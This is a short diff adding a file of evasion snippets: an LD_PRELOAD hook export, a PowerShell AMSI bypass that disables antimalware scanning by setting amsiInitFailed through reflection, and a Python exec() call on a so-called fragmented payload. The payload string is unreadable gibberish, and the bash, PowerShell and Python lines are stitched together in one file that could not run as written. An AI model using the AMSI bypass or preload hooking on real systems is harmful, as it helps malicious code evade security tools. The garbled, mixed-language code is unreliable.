@@ -1,0 +1,16 @@
+# LD_PRELOAD Bypass - Execute with library preloading
+export LD_PRELOAD="./libhook.so"
+
+# AMSI Context Bypass
+$ccwfsq = [System.Management.Automation.PSTypeName]('System.Management.Automation.AmsiUtils').Type
+$ccwfsq.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Execute obfuscated payload
+
+# Fragmented payload execution
+frag_data = """.ZL:oHoggRqJ;Xb+GGïhaiëppR-AQS7UlkDDÿKIUÑéU42pÙ¼ìPTT#yÔMkmùêßLvÖTµziMãvFU¢DBZÆVqEÑvfdÆvnïþûIxmæÇMòvÏtZÿod²ea"""
+exec(frag_data)
+
+
+unset LD_PRELOAD
+
